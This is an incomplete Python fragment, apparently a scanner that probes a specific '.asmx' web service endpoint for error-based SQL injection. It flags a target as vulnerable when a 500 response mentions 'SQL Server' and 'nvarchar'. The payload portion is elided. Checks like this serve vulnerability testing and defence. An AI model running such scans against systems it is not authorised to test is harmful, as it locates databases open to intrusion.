...
def check(url):
    u = f"{url}/WebService/wsAutoComplete.asmx/GetAccountTitleList"
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2268.133 Safari/537.36',
    ...
    try:
        ...
        html=a.text
        b = a.status_code
        if b == 500 and "SQL Server" in html and "nvarchar" in html:
            print('[+]存在漏洞',url)
        else:
            print('[-]不存在漏洞',url)
